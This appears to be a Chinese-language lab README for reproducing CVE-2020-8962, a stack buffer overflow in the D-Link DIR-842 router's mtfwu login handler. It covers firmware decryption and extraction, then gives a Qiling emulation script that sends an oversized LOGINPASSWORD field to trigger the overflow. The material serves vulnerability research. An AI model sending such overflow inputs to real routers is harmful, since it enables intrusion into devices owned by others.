# D-Link DIR-842 栈溢出漏洞（CVE-2020-8962）

## 漏洞环境

需要解密固件，方法是开启一个 `qemu-user-static` 容器，使用 qemu-mips-static 运行 DIR842C1_FW302b03_middle.bin 的 `usr/sbin/encimg` 程序对 DIR842C1_FW313WWb05.bin.org 进行解密，得到 DIR842C1_FW313WWb05.bin。

```sh
$ docker run --privileged --rm -v $PWD/firmware:/root/firmware -it firmianay/qemu-user-static /bin/bash
$ ./qemu-mips-static -L . ./usr/sbin/encimg ./DIR842C1_FW313WWb05.bin.org

# 98868352a4913aee2d2da4acd8e1a04e  DIR842C1_FW302b03_middle.bin
# c40930278051bbf66f24a657676dd5b4  DIR842C1_FW313WWb05.bin
# ae141c12535cae08e49e4876410ebb9d  DIR842C1_FW313WWb05.bin.org
```

本目录下对固件已经是解密版本，可以直接使用 `firmianay/binwalk` 解压固件：

```sh
$ docker run --rm -v $PWD/firmware/:/root/firmware firmianay/binwalk -Mer "/root/firmware/DIR842C1_FW313WWb05.bin"
```

构建本例镜像：

```sh
# 构建镜像
$ docker-compose -f docker-compose-qiling.yml build

# 进入容器
$ ssh -D 2345 root@127.0.0.1 -p 1234
```

## 漏洞复现

## Exploit

```py
from qiling import *

def my_syscall_sysinfo(ql, sysinfo_info, *args, **kwargs):
    ql.mem.write(sysinfo_info, b"AAAA") # uptime
    regreturn = 0
    ql.nprint("sysinfo(0x%x) = %d" % (sysinfo_info, regreturn))
    ql.os.definesyscall_return(regreturn)

# dump all registers
def dump_reg(ql, *args, **kwargs):
    for idx, val in ql.reg.save().items():
        if not isinstance(idx, int):
            print(idx, ":", hex(val))
            
    breakpoint()

class Fake_stdin:
    def read(self, size, *args, **kwargs):
        return b'ACTION=login&LOGINPASSWORD=' + b'A' * 0x248

    def fileno(self, *args, **kwargs):
        return 0

if __name__ == "__main__":

    envs = {
            "REQUEST_METHOD": "POST",
            "REQUEST_URI": "/MTFWU",
            "CONTENT_TYPE": "application/x-www-form-urlencoded",
            "HTTP_MTFWU_ACT": "Login",
            "HTTP_COOKIE": "uid=AAAA",
            "CONTENT_LENGTH": str(27+0x248), 
            }

    ql = Qiling(["squashfs-root/usr/sbin/mtfwu"], "squashfs-root", 
                output="default",
                env=envs,           # setting environment variables 
                stdin=Fake_stdin()) # hijack stdin with Fake_stdin
                
    ql.set_syscall("sysinfo", my_syscall_sysinfo)  # syscall hook for sysinfo
    ql.set_syscall("_newselect", lambda *_: None)  # hook syscall _newselect with anonymous NOP function to avoid manual input requirement
    ql.hook_address(dump_reg, 0x41db40)            # breakpoint before return and dump all register
    ql.run()
```

## 参考链接

- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8962
- https://ctrsec.io/index.php/2020/02/12/cve-2020-8962-d-link-dir-842-stack-based-buffer-overflow/
- https://ucgjhe.github.io/post/cve_2020_8962/
